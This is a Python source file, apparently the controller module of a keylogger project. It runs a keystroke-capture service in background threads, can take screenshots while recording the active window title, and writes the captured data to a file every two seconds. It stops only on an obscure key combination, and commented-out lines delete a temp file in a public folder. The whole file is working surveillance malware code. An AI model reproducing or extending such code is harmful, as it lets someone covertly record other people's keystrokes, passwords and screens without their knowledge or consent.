import pygetwindow

from Write_to_file import FileWriter
from KeyLogger_Service import KeyloggerService

import os
import time
import keyboard
import threading




class KeyLoggerManager:
    def __init__(self, if_screenshot=True):
        ''' you can type False to the service to disable screenshots '''
        self.__instance = KeyloggerService(if_screenshot)
        self.__if_screenshot = if_screenshot

    def start(self):
        self.__instance._start()

    def write_file(self):
        writer = FileWriter()
        writer.write_to_file(self.__instance.data)
        # os.remove(r"C:\Users\Public\tmp.json")

    def __thread_take_shot(self):
        while self.__instance._KeyloggerService__action:
            try:
                self.__instance._take_shot()
            except Exception as e:
                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__data, ('error in:',pygetwindow.getActiveWindowTitle(),'exception:',e))
            time.sleep(0.5)

    def __write_file(self):
        time.sleep(2)
        while self.__instance._KeyloggerService__action:
            try:
                self.write_file()
            except Exception as e:
                self.__instance._KeyloggerService__add_to_data(self.__instance._KeyloggerService__data, e)
            time.sleep(2)
        self.write_file()
        # os.remove(r"C:\Users\Public\tmp.json")

    def main(self):
        threading.Thread(target=self.start).start()
        threading.Thread(target=self.__write_file).start()
        if self.__if_screenshot:
            threading.Thread(target=self.__thread_take_shot).start()
        while self.__instance._KeyloggerService__action:
            self.stop()
            time.sleep(0.1)


    def stop(self):
        if keyboard.is_pressed('shift+q+ctrl+space+backspace'):
            self.__instance._KeyloggerService__change_action()



KeyLoggerManager(False).main()